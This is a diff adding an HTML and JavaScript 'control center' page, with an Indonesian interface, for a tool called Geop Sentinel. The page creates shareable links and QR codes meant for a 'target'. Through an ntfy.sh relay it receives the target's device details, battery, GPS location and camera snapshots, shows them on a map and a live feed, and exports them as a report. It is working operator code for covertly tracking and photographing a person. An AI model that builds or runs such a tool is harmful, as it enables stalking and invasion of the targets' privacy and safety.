@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Geop Sentinel — Pusat Kendali</title>
+<style>
+:root{--bg:#070d18;--card:#0f1a2e;--line:#22304d;--txt:#e6edf7;--mut:#8ea3c8;--acc:#22d3ee;--ok:#34d399;--bad:#f87171;--warn:#fbbf24}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,sans-serif}
+body{background:radial-gradient(1000px 500px at 85% -10%,rgba(34,211,238,.09),transparent),var(--bg);color:var(--txt);min-height:100vh;padding:22px}
+.wrap{max-width:1100px;margin:0 auto}
+header{display:flex;align-items:center;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+header h1{font-size:1.25rem;letter-spacing:.5px}
+header h1 span{color:var(--acc)}
+.dot{width:10px;height:10px;border-radius:50%;background:var(--bad);box-shadow:0 0 12px var(--bad)}
+.dot.on{background:var(--ok);box-shadow:0 0 12px var(--ok)}
+#status{color:var(--mut);font-size:.75rem;margin-left:auto}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;margin-bottom:16px}
+.card h2{font-size:.8rem;color:var(--acc);letter-spacing:1.5px;margin-bottom:12px}
+.row{display:flex;gap:10px;flex-wrap:wrap}
+input{flex:1;min-width:200px;background:#0b1220;border:1px solid var(--line);border-radius:10px;padding:11px 12px;color:var(--txt);font-size:.8rem}
+button{border:none;border-radius:10px;padding:11px 16px;font-weight:700;cursor:pointer;font-size:.78rem;background:linear-gradient(90deg,#0891b2,#22d3ee);color:#03121a}
+button.ghost{background:transparent;border:1px solid var(--line);color:var(--mut)}
+.linkbox{margin-top:12px}
+#qrBox{display:flex;gap:14px;align-items:center;margin-top:12px}
+#qr{border-radius:12px;border:1px solid var(--line);background:#fff;padding:6px}
+.feedwrap{position:relative;border-radius:14px;overflow:hidden;border:1px solid var(--line);background:#000;min-height:260px;display:flex;align-items:center;justify-content:center}
+#feed{width:100%;display:block;max-height:420px;object-fit:contain}
+.live{position:absolute;top:10px;left:10px;background:rgba(248,113,113,.9);color:#fff;font-size:.68rem;font-weight:800;padding:4px 10px;border-radius:999px;letter-spacing:1px}
+#feedTime{position:absolute;bottom:8px;right:10px;font-size:.68rem;color:#fff;background:rgba(0,0,0,.55);padding:3px 8px;border-radius:6px}
+.kv{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px 18px;margin:14px 0}
+.kv div span{display:block;color:var(--mut);font-size:.68rem;margin-bottom:2px}
+.kv div b{font-size:.82rem}
+#map{width:100%;height:260px;border:none;border-radius:12px;border:1px solid var(--line)}
+.log{max-height:220px;overflow:auto;background:#0b1220;border:1px solid var(--line);border-radius:10px;padding:10px;font-size:.73rem;color:var(--mut)}
+.ln{margin:3px 0}.ln span{color:var(--acc);margin-right:8px}
+a{color:var(--acc)}
+small.note{color:var(--mut);font-size:.7rem;display:block;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <div class="dot" id="dot"></div>
+  <h1>🛰️ GEOP <span>SENTINEL</span> — PUSAT KENDALI</h1>
+  <div id="status">BELUM MENGAWASI</div>
+</header>
+
+<div class="grid">
+  <div>
+    <div class="card">
+      <h2>🔗 GENERATOR LINK</h2>
+      <div class="row">
+        <button id="btnNew">⚡ Buat Link Baru</button>
+        <button class="ghost" id="btnCopy">📋 Salin Link</button>
+      </div>
+      <div class="linkbox"><input id="linkOut" readonly placeholder="Link akan muncul di sini…"></div>
+      <div id="qrBox" hidden><img id="qr" width="140" height="140" alt="QR"><small class="note">QR Code — scan dari HP target.</small></div>
+    </div>
+    <div class="card">
+      <h2>📡 SAMBUNGKAN TOPIC LAMA</h2>
+      <div class="row">
+        <input id="watchIn" placeholder="tempel topic / link lama…">
+        <button class="ghost" id="btnWatch">🔌 Sambung</button>
+        <button class="ghost" id="btnStop">⛔ Stop</button>
+      </div>
+      <small class="note">Data relay tersimpan 12 jam di ntfy.sh. Riwayat otomatis dimuat saat menyambung.</small>
+    </div>
+    <div class="card">
+      <h2>📜 LOG KEJADIAN</h2>
+      <div class="log" id="log"><div class="ln">Menunggu aktivitas…</div></div>
+      <div class="row" style="margin-top:10px"><button class="ghost" id="btnExport">📥 Export Laporan JSON</button></div>
+    </div>
+  </div>
+  <div>
+    <div class="card">
+      <h2>🎥 FEED KAMERA LIVE</h2>
+      <div class="feedwrap">
+        <img id="feed" alt="Menunggu snapshot…">
+        <div class="live">● LIVE</div>
+        <div id="feedTime">–</div>
+      </div>
+    </div>
+    <div class="card">
+      <h2>📍 TELEMETRI TARGET</h2>
+      <div class="kv">
+        <div><span>PERANGKAT</span><b id="dev">–</b></div>
+        <div><span>JARINGAN</span><b id="net">–</b></div>
+        <div><span>BATERAI</span><b id="batt">–</b></div>
+        <div><span>AKURASI GPS</span><b id="acc">–</b></div>
+      </div>
+      <div class="kv"><div style="grid-column:1/-1"><span>KOORDINAT</span><b id="coord">–</b> &nbsp;<a id="gmaps" target="_blank" href="#">Buka Google Maps ↗</a></div></div>
+      <iframe id="map" src="about:blank"></iframe>
+    </div>
+  </div>
+</div>
+</div>
+<script>
+const NT='https://ntfy.sh/';
+const $=s=>document.querySelector(s);
+const esc=s=>String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+let topic=null,es=null,events=[],raw=[];
+
+function rndTopic(){const c='abcdefghijklmnopqrstuvwxyz0123456789';return[...crypto.getRandomValues(new Uint8Array(14))].map(x=>c[x%c.length]).join('')}
+function viewerUrl(t){return new URL('viewer.html?t='+t,location.href).href}
+
+$('#btnNew').onclick=()=>{
+  const t=rndTopic();
+  localStorage.setItem('sentinel_topic',t);
+  $('#linkOut').value=viewerUrl(t);
+  $('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(viewerUrl(t));
+  $('#qrBox').hidden=false;
+  startWatch(t);
+};
+$('#btnCopy').onclick=async()=>{try{await navigator.clipboard.writeText($('#linkOut').value);alert('Link disalin ✅');}catch(e){$('#linkOut').select();document.execCommand('copy');}};
+$('#btnWatch').onclick=()=>{
+  let v=$('#watchIn').value.trim();
+  const m=v.match(/t=([a-z0-9]+)/i); if(m)v=m[1];
+  if(v)startWatch(v);
+};
+$('#btnStop').onclick=stopWatch;
+$('#btnExport').onclick=()=>{
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([JSON.stringify({topic,exported:new Date().toISOString(),events:raw},null,2)],{type:'application/json'}));
+  a.download='sentinel_report_'+(topic||'x')+'.json';a.click();
+};
+
+async function startWatch(t){
+  stopWatch(); topic=t; events=[]; raw=[];
+  $('#status').textContent='MENGAWASI: '+t;
+  $('#dot').classList.add('on');
+  pushLog('📡 Menghubungkan ke relay…');
+  try{
+    const r=await fetch(NT+t+'/json?poll=1');
+    (await r.text()).split('\n').filter(Boolean).forEach(l=>{try{handle(JSON.parse(l))}catch(e){}});
+  }catch(e){pushLog('⚠️ Gagal memuat riwayat');}
+  es=new EventSource(NT+t+'/sse');
+  es.onmessage=e=>{try{handle(JSON.parse(e.data))}catch(err){}};
+  pushLog('✅ LIVE terhubung. Bagikan link ke target.');
+}
+function stopWatch(){if(es){es.close();es=null;}$('#dot').classList.remove('on');$('#status').textContent='BELUM MENGAWASI';}
+
+function handle(m){
+  if(m.event&&m.event!=='message')return;
+  raw.push(m);
+  const time=new Date((m.time||Date.now()/1000)*1000).toLocaleTimeString('id-ID');
+  const t=m.title||'';
+  if(t==='META'){try{const d=JSON.parse(m.message);$('#dev').textContent=d.device||'–';$('#net').textContent=d.net||'–';$('#batt').textContent=d.batt||'–';pushLog('📱 Perangkat: '+esc((d.device||'').slice(0,60)));}catch(e){}}
+  else if(t==='LOC'){try{const d=JSON.parse(m.message);
+    $('#coord').textContent=d.lat.toFixed(6)+', '+d.lon.toFixed(6);
+    $('#acc').textContent='±'+Math.round(d.acc)+' m';
+    $('#map').src='https://www.openstreetmap.org/export/embed.html?bbox='+(d.lon-0.004)+','+(d.lat-0.0025)+','+(d.lon+0.004)+','+(d.lat+0.0025)+'&layer=mapnik&marker='+d.lat+','+d.lon;
+    $('#gmaps').href='https://www.google.com/maps/search/?api=1&query='+d.lat+','+d.lon;
+    pushLog('📍 Lokasi: '+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+' (±'+Math.round(d.acc)+'m)');}catch(e){}}
+  else if(t==='CAM'){ if(m.attachment&&m.attachment.url){$('#feed').src=m.attachment.url;$('#feedTime').textContent='Snapshot '+time;} pushLog('📸 Snapshot kamera diterima'); }
+  else if(t==='STATUS'){ pushLog('ℹ️ '+esc(m.message||'')); }
+}
+function pushLog(s){
+  events.unshift({time:new Date().toLocaleTimeString('id-ID'),s});
+  $('#log').innerHTML=events.slice(0,80).map(e=>'<div class="ln"><span>'+e.time+'</span>'+e.s+'</div>').join('');
+}
+window.addEventListener('load',()=>{
+  const t=localStorage.getItem('sentinel_topic');
+  if(t){$('#linkOut').value=viewerUrl(t);$('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(viewerUrl(t));$('#qrBox').hidden=false;startWatch(t);}
+});
+</script>
+</body>
+</html>
